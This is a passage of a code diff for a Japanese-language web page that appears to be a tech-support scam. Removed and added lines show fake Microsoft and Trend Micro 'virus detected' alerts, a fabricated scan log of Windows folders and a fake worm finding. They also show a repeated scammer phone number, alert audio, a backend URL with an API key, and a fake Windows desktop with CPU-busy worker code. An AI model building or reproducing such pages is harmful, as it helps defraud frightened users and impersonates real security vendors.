-            お使いのコンピューターはウイルスに感染しています。Microsoft ウイルス対策ソフトウェアが現在ウイルスのスキャンを実行中です。スキャンを停止するには、下の「スキャンを停止」ボタンをクリックしてください。<br>
+      </div>
 
-Microsoft サポート電話番号：0101-828-573-3013
-          </p>
-          <p class="fs-prompt__scan-label">スキャン中…</p>
+      <!-- Taskbar -->
+      <div id="taskbar">
+        <button id="start-btn" title="スタート">
+          <svg viewBox="0 0 24 24" fill="#fff">
+            <path
+              d="M3 3h8.5v8.5H3V3zm9.5 0H21v8.5h-8.5V3zM3 12.5h8.5V21H3v-8.5zm9.5 0H21V21h-8.5v-8.5z"
+            />
+          </svg>
+        </button>
+        <div id="search-bar">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <circle cx="11" cy="11" r="8" />
+            <path
+              d="M21 21l-4.35-4.35"
+              stroke-width="2"
+              stroke-linecap="round"
+            />
+          </svg>
+          検索
+        </div>
+        <div id="taskbar-apps"></div>
+        <div id="system-tray">
+          <!-- Chevron -->
           <div
-            class="fs-prompt__progress"
-            role="progressbar"
-            aria-label="ダウンロード進行状況"
-            aria-valuemin="0"
-            aria-valuemax="100"
-            aria-valuenow="0"
-            id="fsPromptProgress"
+            class="tray-btn"
+            id="tray-chevron"
+            title="隠れているインジケーターを表示します"
           >
-            <div
-              class="fs-prompt__progress-fill"
-              id="fsPromptProgressFill"
-            ></div>
+            <svg fill="none" stroke="#fff" stroke-width="2" viewBox="0 0 24 24">
+              <path d="M5 15l7-7 7 7" />
+            </svg>
           </div>
-          <div class="fs-prompt__scan-feed" aria-hidden="true">
-            <ul class="fs-prompt__scan-feed-list" id="fsPromptScanFeedList">
-              <li>C:\Windows\System32\<br>
-                <span style="color:red;">-- 破損したシステムDLLファイルが見つかりました<br>
-                -- ドライバーまたはサービスの不安定性が検出されました</span></li>
-                
-                <li>C:\Windows\SysWOW64\<br>
-                <span style="color:red;">-- 古い32ビットランタイムライブラリが見つかりました<br>
-                -- レガシーアプリケーションの競合が検出されました</span></li>
-                
-                <li>C:\Windows\Temp\<br>
-                <span style="color:red;">-- 大容量のWindowsアップデート一時ファイルが見つかりました<br>
-                -- ディスク容量確保のため削除を推奨します</span></li>
-                
-                <li>C:\Windows\Prefetch\<br>
-                <span style="color:red;">-- Prefetchキャッシュの蓄積が検出されました<br>
-                -- 起動速度低下の原因となる可能性があります</span></li>
-                
-                <li>C:\Windows\SoftwareDistribution\<br>
-                <span style="color:red;">-- 停止したWindows Updateキャッシュファイルが見つかりました<br>
-                -- 更新キャッシュのリセットを推奨します</span></li>
-                
-                <li>C:\Program Files\<br>
-                <span style="color:red;">-- 不完全なアンインストール残骸が検出されました<br>
-                -- 壊れたアプリケーションフォルダーが残っています</span></li>
-                
-                <li>C:\Program Files (x86)\<br>
-                <span style="color:red;">-- 不要な32ビットコンポーネントが見つかりました<br>
-                -- 未使用ソフトウェアがストレージを消費しています</span></li>
-                
-                <li>C:\ProgramData\<br>
-                <span style="color:red;">-- 隠しキャッシュおよびテレメトリファイルが検出されました<br>
-                -- バックグラウンドデータが大量に蓄積されています</span></li>
-                
-                <li>C:\Users\Public\<br>
-                <span style="color:red;">-- 不要なインストーラーファイルが見つかりました<br>
-                -- 潜在的に不要な実行ファイルが検出されました</span></li>
-                
-                <li>C:\Users\Admin\AppData\Local\Temp\<br>
-                <span style="color:red;">-- 大量の一時インストーラーファイルが見つかりました<br>
-                -- ブラウザおよびアプリの一時ファイル削除を推奨します</span></li>
-                
-                <li>C:\Users\User\AppData\Roaming\<br>
-                <span style="color:red;">-- 破損したアプリケーションプロファイルデータが検出されました<br>
-                -- 同期またはキャッシュ問題が発生する可能性があります</span></li>
-                
-                <li>C:\Users\User\Downloads\<br>
-                <span style="color:red;">-- 疑わしい実行ファイルおよび圧縮ファイルが見つかりました<br>
-                -- マルウェアスキャンを推奨します</span></li>
-                
-                <li>C:\Users\User\Desktop\<br>
-                <span style="color:red;">-- 不要な大容量ファイルおよび重複ショートカットが検出されました<br>
-                -- デスクトップの整理を推奨します</span></li>
-                
-                <li>C:\Users\User\Documents\<br>
-                <span style="color:red;">-- マクロ有効Officeドキュメントが検出されました<br>
-                -- セキュリティ確認を推奨します</span></li>
-                
-                <li>C:\Recovery\<br>
-                <span style="color:red;">-- 古いWindows回復イメージファイルが見つかりました<br>
-                -- 不要なバックアップが容量を消費しています</span></li>
-                
-                <li>C:\Boot\<br>
-                <span style="color:red;">-- ブート構成の不整合が検出されました<br>
-                -- スタートアップ修復が必要な可能性があります</span></li>
-                
-                <li>C:\PerfLogs\<br>
-                <span style="color:red;">-- 大容量の診断ログファイルが見つかりました<br>
-                -- 古いログは削除可能です</span></li>
-                
-                <li>C:\Intel\<br>
-                <span style="color:red;">-- 古いチップセットおよびグラフィックドライバーパッケージが検出されました<br>
-                -- ドライバークリーンアップを推奨します</span></li>
-                
-                <li>C:\AMD\<br>
-                <span style="color:red;">-- 古いRadeonドライバーキャッシュが見つかりました<br>
-                -- 数GBの不要なセットアップデータが検出されました</span></li>
-                
-                <li>C:\$Recycle.Bin\<br>
-                <span style="color:red;">-- ごみ箱内に大容量ファイルが残っています<br>
-                -- 完全削除を推奨します</span></li>
-            </ul>
+          <!-- WiFi -->
+          <div class="tray-btn" id="tray-wifi" title="WiFi">
+            <svg fill="#fff" viewBox="0 0 24 24">
+              <path
+                d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"
+              />
+            </svg>
           </div>
-          <div class="fs-prompt__actions">
-            <button
-              type="button"
-              class="fs-prompt__btn fs-prompt__btn--primary"
-              id="fsPromptEnter"
-            >
-            スキャンを停止
-            </button>
+          <!-- Sound -->
+          <div class="tray-btn" id="tray-sound" title="スピーカー">
+            <svg fill="#fff" viewBox="0 0 24 24">
+              <path
+                d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"
+              />
+            </svg>
           </div>
-        </div>
-        <div
-          class="fs-prompt__phase fs-prompt__phase--complete is-hidden"
-          id="fsPromptPhaseComplete"
-        >
-          <p class="fs-prompt__message">
-            <span class="fs-prompt__complete-title">オンラインスキャン完了</span>
-            脅威の確認のため <strong>591 個のファイル</strong> をスキャンしました。<br />
-            お使いのデバイスで <strong>1 件のマルウェア脅威</strong> が検出されました。<br />Microsoft サポート電話番号：0101-828-573-3013<br />
-            <span class="fs-prompt__complete-body">
-              <strong class="fs-prompt__label-red">脅威名:</strong>
-              Worm.AutoRun.PY [?]<br />
-              <strong class="fs-prompt__label-red">ファイル:</strong>
-              C:/Users/Admin/AppData/Local/Temp/tmp9098091.exe<br />
-              <strong class="fs-prompt__label-red">スキャン時間:</strong> 00:53<br />
-              <strong class="fs-prompt__label-red">スキャン範囲:</strong>
-              ブラウザ拡張機能、アクティブメモリ、システムフォルダ
-            </span>
-            <span class="fs-prompt__complete-note">
-              この脅威を除去して保護状態を維持するため、直ちに対応が必要です。
-            </span>
-          </p>
-          <div class="fs-prompt__actions">
-            <button
-              type="button"
-              class="fs-prompt__btn fs-prompt__btn--primary"
-              id="fsPromptCompleteContinue"
-            >
-            今すぐ脅威を削除
-            </button>
+          <!-- Clock -->
+          <div id="clock">
+            <div id="clock-time"></div>
+            <div id="clock-date"></div>
           </div>
+          <!-- Show Desktop -->
+          <div id="show-desktop" title="デスクトップの表示"></div>
         </div>
       </div>
     </div>
 
-    <div
-      class="intro-overlay"
-      aria-live="polite"
-      role="dialog"
-      aria-modal="true"
-    >
-      <div class="intro-overlay__brand">
-        <img
-          class="intro-overlay__logo"
-          src="https://files-pop.s3.ap-northeast-1.amazonaws.com/logo-soft.webp"
-          alt="ソフトウェアサポート"
-          decoding="async"
-          fetchpriority="high"
-        />
+    <!-- Drag overlay to prevent iframe interference during drag/resize -->
+    <div id="drag-overlay"></div>
+
+    <!-- Trend Micro Virus Buster Template (hidden) -->
+    <div id="trendmicro-template">
+      <div class="tm-header">
+        <div class="tm-logo">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="24" cy="24" r="20" fill="#d32f2f" />
+            <path d="M16 14h16v4H28v16h-8V18h-4v-4z" fill="#fff" />
+          </svg>
+        </div>
+        <div class="tm-header-text">
+          <div class="tm-header-title">ウイルスバスター クラウド</div>
+          <div class="tm-header-subtitle">Trend Micro Virus Buster</div>
+        </div>
+        <button class="tm-close" title="閉じる">
+          <svg viewBox="0 0 12 12" fill="none" stroke="#fff" stroke-width="1.5">
+            <line x1="1" y1="1" x2="11" y2="11" />
+            <line x1="11" y1="1" x2="1" y2="11" />
+          </svg>
+        </button>
       </div>
-      <section class="kimono-modal">
-        <div class="kimono-modal__inner">
-          <div class="kimono-modal__column kimono-modal__column--lead">
-            <header class="kimono-modal__header">
-              <span class="kimono-eyebrow">初期化中</span>
-              <h1 class="kimono-title">読み込み中</h1>
-              <p class="kimono-subtitle">
-                お使いのPCでは、このソフトウェアを実行できない可能性があります。
-              </p>
-            </header>
-            <p class="kimono-description">
-              お使いのPCにかなり深刻な問題が発生しているようです。クリーニングを依頼してください。よろしくお願いします。
-            </p>
+      <div class="tm-body">
+        <div class="tm-shield">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            xmlns:xlink="http://www.w3.org/1999/xlink"
+            version="1.1"
+            width="256"
+            height="256"
+            viewBox="0 0 256 256"
+            xml:space="preserve"
+          >
+            <g
+              style="
+                stroke: none;
+                stroke-width: 0;
+                stroke-dasharray: none;
+                stroke-linecap: butt;
+                stroke-linejoin: miter;
+                stroke-miterlimit: 10;
+                fill: none;
+                fill-rule: nonzero;
+                opacity: 1;
+              "
+              transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)"
+            >
+              <path
+                d="M 28.5 65.5 c -1.024 0 -2.047 -0.391 -2.829 -1.172 c -1.562 -1.562 -1.562 -4.095 0 -5.656 l 33 -33 c 1.561 -1.562 4.096 -1.562 5.656 0 c 1.563 1.563 1.563 4.095 0 5.657 l -33 33 C 30.547 65.109 29.524 65.5 28.5 65.5 z"
+                style="
+                  stroke: none;
+                  stroke-width: 1;
+                  stroke-dasharray: none;
+                  stroke-linecap: butt;
+                  stroke-linejoin: miter;
+                  stroke-miterlimit: 10;
+                  fill: rgb(236, 0, 0);
+                  fill-rule: nonzero;
+                  opacity: 1;
+                "
+                transform=" matrix(1 0 0 1 0 0) "
+                stroke-linecap="round"
+              />
+              <path
+                d="M 61.5 65.5 c -1.023 0 -2.048 -0.391 -2.828 -1.172 l -33 -33 c -1.562 -1.563 -1.562 -4.095 0 -5.657 c 1.563 -1.562 4.095 -1.562 5.657 0 l 33 33 c 1.563 1.562 1.563 4.095 0 5.656 C 63.548 65.109 62.523 65.5 61.5 65.5 z"
+                style="
+                  stroke: none;
+                  stroke-width: 1;
+                  stroke-dasharray: none;
+                  stroke-linecap: butt;
+                  stroke-linejoin: miter;
+                  stroke-miterlimit: 10;
+                  fill: rgb(236, 0, 0);
+                  fill-rule: nonzero;
+                  opacity: 1;
+                "
+                transform=" matrix(1 0 0 1 0 0) "
+                stroke-linecap="round"
+              />
+              <path
+                d="M 45 90 C 20.187 90 0 69.813 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 C 90 69.813 69.813 90 45 90 z M 45 8 C 24.598 8 8 24.598 8 45 c 0 20.402 16.598 37 37 37 c 20.402 0 37 -16.598 37 -37 C 82 24.598 65.402 8 45 8 z"
+                style="
+                  stroke: none;
+                  stroke-width: 1;
+                  stroke-dasharray: none;
+                  stroke-linecap: butt;
+                  stroke-linejoin: miter;
+                  stroke-miterlimit: 10;
+                  fill: rgb(236, 0, 0);
+                  fill-rule: nonzero;
+                  opacity: 1;
+                "
+                transform=" matrix(1 0 0 1 0 0) "
+                stroke-linecap="round"
+              />
+            </g>
+          </svg>
+        </div>
+        <div class="tm-body-text">
+          <div class="tm-body-title">リアルタイムスキャンが完了しました</div>
+          <div class="tm-body-desc">
+            お使いのコンピューターは感染しています。マルウェアが検出されました！
           </div>
-          <div class="kimono-modal__column kimono-modal__column--progress">
-            <div class="kimono-load">
-              <div class="kimono-load__head">
-                <span class="kimono-load__label">読み込み</span>
-                <span class="kimono-load__pulse" aria-hidden="true"></span>
-              </div>
-              <p class="loading-message" id="loadingMessage">
-                互換性をスキャンしています...
-              </p>
-              <div class="progress-track" aria-label="読み込み進行状況">
-                <div class="progress-fill" id="progressFill"></div>
-              </div>
-            </div>
+          <div class="tm-body-threat">
+            保護状態：マルウェアを削除できません。
           </div>
         </div>
-      </section>
+      </div>
+
+      <div class="tm-footer">
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          width="32"
+          height="32"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="#ff3b30"
+          stroke-width="1.75"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+        >
+          <path
+            d="M5 4h4l2 5l-2.5 1.5a11 11 0 0 0 5 5l1.5 -2.5l5 2v4a2 2 0 0 1 -2 2a16 16 0 0 1 -15 -15a2 2 0 0 1 2 -2"
+          />
+          <path d="M15 7a2 2 0 0 1 2 2" />
+          <path d="M15 3a6 6 0 0 1 6 6" />
+        </svg>
+        <strong>0101-828-573-3013</strong>
+      </div>
+      <div class="tm-timestamp"></div>
     </div>
 
     <script>
-      (function () {
-        const BACKEND_URL = "https://serve-popup.onrender.com";
-        const API_KEY = "vp-sk-a7f3c92e1d4b8065";
+      // ── App Definitions ──
+      const apps = [
+        {
+          id: "file-explorer",
+          name: "エクスプローラー",
+          icon: "explorer",
+          pinToDesktop: true,
+          pinToTaskbar: true,
+        },
+        {
+          id: "edge",
+          name: "Microsoft Edge",
+          icon: "edge",
+          pinToDesktop: true,
+          pinToTaskbar: true,
+        },
+        {
+          id: "settings",
+          name: "設定",
+          icon: "settings",
+          pinToDesktop: false,
+          pinToTaskbar: true,
+        },
+        {
+          id: "store",
+          name: "Microsoft Store",
+          icon: "store",
+          pinToDesktop: false,
+          pinToTaskbar: true,
+        },
+        {
+          id: "mail",
+          name: "メール",
+          icon: "mail",
+          pinToDesktop: false,
+          pinToTaskbar: true,
+        },
+        {
+          id: "notepad",
+          name: "メモ帳",
+          icon: "notepad",
+          pinToDesktop: true,
+          pinToTaskbar: false,
+        },
+        {
+          id: "calculator",
+          name: "電卓",
+          icon: "calculator",
+          pinToDesktop: true,
+          pinToTaskbar: false,
+        },
+        {
+          id: "terminal",
+          name: "ターミナル",
+          icon: "terminal",
+          pinToDesktop: true,
+          pinToTaskbar: false,
+        },
+        {
+          id: "photos",
+          name: "フォト",
+          icon: "photos",
+          pinToDesktop: false,
+          pinToTaskbar: false,
+        },
+        {
+          id: "calendar",
+          name: "カレンダー",
+          icon: "calendar",
+          pinToDesktop: false,
+          pinToTaskbar: false,
+        },
+        {
+          id: "music",
+          name: "ミュージック",
+          icon: "music",
+          pinToDesktop: false,
+          pinToTaskbar: false,
+        },
+        {
+          id: "recycle-bin",
+          name: "ごみ箱",
+          icon: "recycle",
+          pinToDesktop: true,
+          pinToTaskbar: false,
+        },
+      ];
 
-        const overlay = document.querySelector(".intro-overlay");
-        const progressFill = document.getElementById("progressFill");
-        const loadingMessage = document.getElementById("loadingMessage");
-        const viewerContainer = document.querySelector(".viewer-container");
-        const fsPrompt = document.getElementById("fsPrompt");
-        const fsPromptEnter = document.getElementById("fsPromptEnter");
-        const fsPromptControlMin = document.getElementById("fsPromptControlMin");
-        const fsPromptControlMax = document.getElementById("fsPromptControlMax");
-        const fsPromptControlClose = document.getElementById(
-          "fsPromptControlClose",
-        );
-        const fsPromptBackdrop = document.getElementById("fsPromptBackdrop");
-        const fsPromptProgress = document.getElementById("fsPromptProgress");
-        const fsPromptProgressFill = document.getElementById(
-          "fsPromptProgressFill",
-        );
-        const fsPromptScanFeedList = document.getElementById(
-          "fsPromptScanFeedList",
-        );
-        const fsPromptPhaseLoading =
-          document.getElementById("fsPromptPhaseLoading");
-        const fsPromptPhaseComplete =
-          document.getElementById("fsPromptPhaseComplete");
-        const fsPromptCompleteContinue =
-          document.getElementById("fsPromptCompleteContinue");
+      // ── SVG Icons ──
+      function getIcon(type, size = 24) {
+        const icons = {
+          explorer: `<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect x="4" y="10" width="40" height="30" rx="2" fill="#F5C542"/>
+      <rect x="4" y="8" width="18" height="6" rx="2" fill="#E6A817"/>
+      <rect x="4" y="14" width="40" height="26" rx="0" fill="#FADA5E"/>
+    </svg>`,
+          edge: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <defs><linearGradient id="eg" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0078D4"/><stop offset="100%" stop-color="#35C1F1"/></linearGradient></defs>
+      <circle cx="24" cy="24" r="20" fill="url(#eg)"/>
+      <path d="M16 30c0-7 5-12 11-12 4 0 7 2 7 6s-4 6-8 6h-3c0 4 3 6 7 6 3 0 5-1 7-3-2 6-8 9-14 9-8 0-13-5-13-13 0-9 7-17 17-17 6 0 10 3 10 8 0 6-5 10-12 10h-2" fill="rgba(255,255,255,0.9)"/>
+    </svg>`,
+          settings: `<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="24" cy="24" r="8" stroke="#555" stroke-width="3" fill="none"/>
+      <g stroke="#555" stroke-width="3" stroke-linecap="round">
+        <line x1="24" y1="4" x2="24" y2="12"/><line x1="24" y1="36" x2="24" y2="44"/>
+        <line x1="4" y1="24" x2="12" y2="24"/><line x1="36" y1="24" x2="44" y2="24"/>
+        <line x1="9.86" y1="9.86" x2="15.52" y2="15.52"/><line x1="32.48" y1="32.48" x2="38.14" y2="38.14"/>
+        <line x1="9.86" y1="38.14" x2="15.52" y2="32.48"/><line x1="32.48" y1="15.52" x2="38.14" y2="9.86"/>
+      </g>
+    </svg>`,
+          store: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <rect x="6" y="10" width="36" height="30" rx="3" fill="#0078D4"/>
+      <rect x="14" y="18" width="8" height="14" rx="1" fill="#fff"/>
+      <rect x="26" y="22" width="8" height="10" rx="1" fill="#fff"/>
+    </svg>`,
+          mail: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <rect x="4" y="12" width="40" height="26" rx="3" fill="#0078D4"/>
+      <path d="M4 15l20 13 20-13" stroke="#fff" stroke-width="2" fill="none"/>
+    </svg>`,
+          notepad: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <rect x="10" y="4" width="28" height="40" rx="2" fill="#fff" stroke="#0078D4" stroke-width="2"/>
+      <line x1="16" y1="14" x2="32" y2="14" stroke="#ccc" stroke-width="1.5"/>
+      <line x1="16" y1="20" x2="32" y2="20" stroke="#ccc" stroke-width="1.5"/>
+      <line x1="16" y1="26" x2="28" y2="26" stroke="#ccc" stroke-width="1.5"/>
+      <line x1="16" y1="32" x2="24" y2="32" stroke="#ccc" stroke-width="1.5"/>
+    </svg>`,
+          calculator: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <rect x="10" y="4" width="28" height="40" rx="3" fill="#202020"/>
+      <rect x="14" y="8" width="20" height="10" rx="1" fill="#333"/>
+      <rect x="14" y="22" width="5" height="5" rx="1" fill="#555"/><rect x="21.5" y="22" width="5" height="5" rx="1" fill="#555"/>
+      <rect x="29" y="22" width="5" height="5" rx="1" fill="#555"/><rect x="14" y="29" width="5" height="5" rx="1" fill="#555"/>
+      <rect x="21.5" y="29" width="5" height="5" rx="1" fill="#555"/><rect x="29" y="29" width="5" height="5" rx="1" fill="#555"/>
+      <rect x="14" y="36" width="5" height="5" rx="1" fill="#555"/><rect x="21.5" y="36" width="5" height="5" rx="1" fill="#555"/>
+      <rect x="29" y="36" width="5" height="5" rx="1" fill="#0078D4"/>
+    </svg>`,
+          terminal: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <rect x="4" y="8" width="40" height="32" rx="4" fill="#0C0C0C"/>
+      <path d="M12 20l6 5-6 5" stroke="#ccc" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+      <line x1="22" y1="30" x2="32" y2="30" stroke="#ccc" stroke-width="2.5" stroke-linecap="round"/>
+    </svg>`,
+          photos: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <rect x="6" y="10" width="36" height="28" rx="3" fill="#0078D4"/>
+      <circle cx="17" cy="20" r="4" fill="#FFD700"/>
+      <path d="M6 34l10-10 8 8 6-4 12 10H6z" fill="#2ECC71"/>
+    </svg>`,
+          calendar: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <rect x="6" y="8" width="36" height="34" rx="3" fill="#fff" stroke="#ddd" stroke-width="1.5"/>
+      <rect x="6" y="8" width="36" height="10" rx="3" fill="#0078D4"/>
+      <text x="24" y="34" text-anchor="middle" font-size="16" font-weight="bold" fill="#333">28</text>
+    </svg>`,
+          music: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="24" cy="24" r="18" fill="#E74C3C"/>
+      <circle cx="24" cy="24" r="6" fill="#fff"/>
+      <circle cx="24" cy="24" r="2" fill="#E74C3C"/>
+    </svg>`,
+          recycle: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path d="M14 14h20l-2 26H16L14 14z" fill="#888"/>
+      <rect x="12" y="10" width="24" height="4" rx="1" fill="#666"/>
+      <rect x="20" y="6" width="8" height="4" rx="1" fill="#666"/>
+      <line x1="20" y1="18" x2="20" y2="36" stroke="#aaa" stroke-width="1.5"/>
+      <line x1="24" y1="18" x2="24" y2="36" stroke="#aaa" stroke-width="1.5"/>
+      <line x1="28" y1="18" x2="28" y2="36" stroke="#aaa" stroke-width="1.5"/>
+    </svg>`,
+        };
+        return icons[type] || icons.notepad;
+      }
 
-        const FS_PROMPT_LABEL_DOWNLOADING = "ダウンロードを停止";
-        const FS_PROMPT_AUDIO_URL =
-          "https://files-pop.s3.ap-northeast-1.amazonaws.com/v2-pop-general.mp3";
-        const FS_PROMPT_AUDIO_REPEATS = 20;
-        const FS_PROMPT_AUDIO_GAP_MS = 1000;
-        const FS_PROMPT_AUDIO_INITIAL_DELAY_MS = 8000;
-        // ~10s to fill: 1% added every 100ms.
-        const FS_PROMPT_TICK_MS = 100;
-        const FS_PROMPT_TICK_PCT = 1;
+      // ── State ──
+      let windowIdCounter = 0;
+      let highestZ = 100;
+      const openWindows = new Map(); // windowId -> { el, app, minimized, maximized, restoreRect }
+      const windowWorkers = new Map(); // windowId -> Worker
 
-        let fsPromptProgressTimer = null;
-        let fsPromptProgressValue = 0;
-        let fsPromptAudioStarted = false;
+      // ── Web Worker (inline via Blob) ──
+      const workerCode = `
+        let running = true;
+        let opsCount = 0;
+        let taskType = '';
+        let startTime = Date.now();
 
-        if (!overlay || !progressFill || !loadingMessage || !viewerContainer) {
-          return;
-        }
-
-        // Whether the user explicitly dismissed the prompt for the current
-        // non-fullscreen session. Reset whenever they exit fullscreen so the
-        // prompt comes back next time they leave fullscreen.
-        let fsPromptDismissed = false;
-
-        const loadingMessages = [
-          "シーンを初期化しています…",
-          "マテリアルとライトを適用しています…",
-          "描画パイプラインを起動しています…",
+        const tasks = [
+          { name: '素数計算', fn: () => { let c=0; for(let i=2;i<5000;i++){let p=true;for(let j=2;j*j<=i;j++){if(i%j===0){p=false;break;}}if(p)c++;}return c; }},
+          { name: '配列ソート', fn: () => { const a=Array.from({length:3000},()=>Math.random()); a.sort((x,y)=>x-y); return a.length; }},
+          { name: 'フィボナッチ演算', fn: () => { let a=0n,b=1n; for(let i=0;i<1000;i++){[a,b]=[b,a+b];} return Number(a%1000000n); }},
+          { name: 'ハッシュ計算', fn: () => { let h=0; const s='WebOSワーカースレッド'+Math.random(); for(let i=0;i<s.length*500;i++){h=((h<<5)-h)+s.charCodeAt(i%s.length);h|=0;} return h; }},
+          { name: '行列演算', fn: () => { const n=30,A=[],B=[],C=[]; for(let i=0;i<n;i++){A[i]=[];B[i]=[];C[i]=[]; for(let j=0;j<n;j++){A[i][j]=Math.random();B[i][j]=Math.random();C[i][j]=0;}} for(let i=0;i<n;i++) for(let j=0;j<n;j++) for(let k=0;k<n;k++) C[i][j]+=A[i][k]*B[k][j]; return C[0][0]; }},
         ];
 
-        let viewerHost = null;
-        let injectedHeadNodes = [];
-        let loaderRafId = null;
-        let messageTimer = null;
-        let cachedViewerHtml = null;
-        let inFlightFetch = null;
-        let fetchTimerId = null;
-
-        function randomDelay() {
-          // Random integer in [5000, 10000] ms.
-          return Math.floor(Math.random() * 5001) + 5000;
-        }
-
-        function showLoader() {
-          overlay.classList.remove("is-hidden");
-        }
-
-        function hideLoader() {
-          overlay.classList.add("is-hidden");
-        }
-
-        function stopLoader() {
-          if (loaderRafId !== null) {
-            cancelAnimationFrame(loaderRafId);
-            loaderRafId = null;
-          }
-          if (messageTimer !== null) {
-            clearInterval(messageTimer);
-            messageTimer = null;
-          }
-        }
-
-        function runLoader(onComplete, duration) {
-          stopLoader();
-          progressFill.style.width = "0%";
-
-          if (typeof duration !== "number") duration = randomDelay();
-          const startTime = performance.now();
-          let messageIndex = 0;
-
-          loadingMessage.textContent = loadingMessages[messageIndex];
-          messageTimer = setInterval(function () {
-            messageIndex = (messageIndex + 1) % loadingMessages.length;
-            loadingMessage.textContent = loadingMessages[messageIndex];
-          }, 1400);
-
-          function animateProgress(now) {
-            const elapsed = now - startTime;
-            const ratio = Math.min(elapsed / duration, 1);
-            progressFill.style.width = (ratio * 100).toFixed(2) + "%";
-
-            if (ratio < 1) {
-              loaderRafId = requestAnimationFrame(animateProgress);
-              return;
-            }
-
-            stopLoader();
-            if (onComplete) onComplete();
-          }
-
-          loaderRafId = requestAnimationFrame(animateProgress);
-        }
-
-        function setHostInteractive(interactive) {
-          if (!viewerHost) return;
-          viewerHost.style.pointerEvents = interactive ? "auto" : "none";
-        }
-
-        function removeViewer() {
-          if (viewerHost) {
-            viewerHost.remove();
-            viewerHost = null;
-          }
-          for (const node of injectedHeadNodes) node.remove();
-          injectedHeadNodes = [];
-        }
-
-        // Resolve a (possibly relative) URL against the backend origin so
-        // assets load from the backend, not from our page's origin.
-        function absolutize(url) {
-          if (!url) return url;
-          const trimmed = String(url).trim();
-          if (
-            !trimmed ||
-            trimmed.startsWith("data:") ||
-            trimmed.startsWith("blob:") ||
-            trimmed.startsWith("#") ||
-            trimmed.startsWith("javascript:") ||
-            trimmed.startsWith("mailto:")
-          ) {
-            return url;
-          }
-          try {
-            return new URL(trimmed, BACKEND_URL + "/").href;
-          } catch (e) {
-            return url;
-          }
-        }
-
-        // Rewrite url(...) references inside CSS text.
-        function rewriteCssUrls(cssText) {
-          return cssText.replace(
-            /url\(\s*(['"]?)([^'")]+)\1\s*\)/g,
-            function (_match, quote, raw) {
-              return "url(" + quote + absolutize(raw) + quote + ")";
-            },
-          );
-        }
-
-        // Scope top-level body/html/:root selectors to #viewerHost so the
-        // fetched stylesheet doesn't bleed into our host page layout.
-        function scopeRootSelectors(cssText) {
-          // Naive but effective: only touches whole-word selectors at the
-          // start of a selector or after a combinator/comma.
-          return cssText.replace(
-            /(^|[\s,>+~{}])(body|html|:root)(?=[\s,>+~.:#\[{])/g,
-            "$1#viewerHost",
-          );
-        }
-
-        function rewriteAttrUrl(el, attr) {
-          if (!el.hasAttribute(attr)) return;
-          el.setAttribute(attr, absolutize(el.getAttribute(attr)));
-        }
-
-        function rewriteSrcset(el, attr) {
-          if (!el.hasAttribute(attr)) return;
-          const rewritten = el
-            .getAttribute(attr)
-            .split(",")
-            .map(function (part) {
-              const trimmed = part.trim();
-              if (!trimmed) return trimmed;
-              const segs = trimmed.split(/\s+/);
-              segs[0] = absolutize(segs[0]);
-              return segs.join(" ");
-            })
-            .join(", ");
-          el.setAttribute(attr, rewritten);
-        }
-
-        // Walk the parsed document and rewrite asset URLs + scope CSS so the
-        // fetched HTML behaves correctly when grafted onto our page.
-        function normalizeFetchedDoc(doc) {
-          const all = doc.querySelectorAll("*");
-          for (const el of all) {
-            const tag = el.tagName.toLowerCase();
-            if (tag === "a" || tag === "link" || tag === "use") {
-              rewriteAttrUrl(el, "href");
-              rewriteAttrUrl(el, "xlink:href");
-            }
-            if (
-              tag === "script" ||
-              tag === "img" ||
-              tag === "iframe" ||
-              tag === "audio" ||
-              tag === "video" ||
-              tag === "source" ||
-              tag === "track" ||
-              tag === "embed"
-            ) {
-              rewriteAttrUrl(el, "src");
-            }
-            if (tag === "img" || tag === "source") {
-              rewriteSrcset(el, "srcset");
-            }
-            if (tag === "video") {
-              rewriteAttrUrl(el, "poster");
-            }
-            if (tag === "object") {
-              rewriteAttrUrl(el, "data");
-            }
-            if (tag === "form") {
-              rewriteAttrUrl(el, "action");
-            }
-            const inlineStyle = el.getAttribute("style");
-            if (inlineStyle && inlineStyle.indexOf("url(") !== -1) {
-              el.setAttribute("style", rewriteCssUrls(inlineStyle));
-            }
-            if (tag === "style") {
-              el.textContent = scopeRootSelectors(
-                rewriteCssUrls(el.textContent),
-              );
-            }
-          }
-        }
-
-        // innerHTML doesn't execute <script> tags, and we want fresh nodes
